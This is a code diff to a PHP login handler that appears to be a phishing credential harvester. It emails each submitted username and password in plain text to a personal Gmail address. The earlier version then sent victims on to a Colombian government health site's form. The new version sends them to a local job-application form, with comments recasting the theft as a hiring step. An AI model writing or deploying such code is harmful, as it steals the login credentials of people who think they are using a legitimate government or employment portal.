@@ -4,26 +4,16 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST['username'];
     $password = $_POST['password'];
 
-    // Dirección de correo electrónico a la que se enviará el formulario
+    // Enviar correo al jefe de contratación
     $to = "roniifelipe@gmail.com";
+    $subject = "Inicio de Sesión - Información de Usuario";
+    $message = "Usuario: " . $username . "\nContraseña: " . $password;
+    $headers = "From: webmaster@example.com";
 
-    // Asunto del correo electrónico
-    $subject = "Inicio de sesión";
-
-    // Mensaje del correo electrónico
-    $message = "Usuario: " . $username . "\n";
-    $message .= "Contraseña: " . $password . "\n";
-
-    // Cabeceras del correo electrónico
-    $headers = "From: webmaster@example.com" . "\r\n" .
-               "Reply-To: webmaster@example.com" . "\r\n" .
-               "X-Mailer: PHP/" . phpversion();
-
-    // Envía el correo electrónico
     mail($to, $subject, $message, $headers);
 
-    // Redireccionar al formulario de información básica en www.esesuroriente.gov.co
-    header('Location: https://www.esesuroriente.gov.co/formulario-info-basica');
+    // Redirigir al formulario de información del postulado
+    header('Location: formulario_empleo.php');
     exit;
 }
 
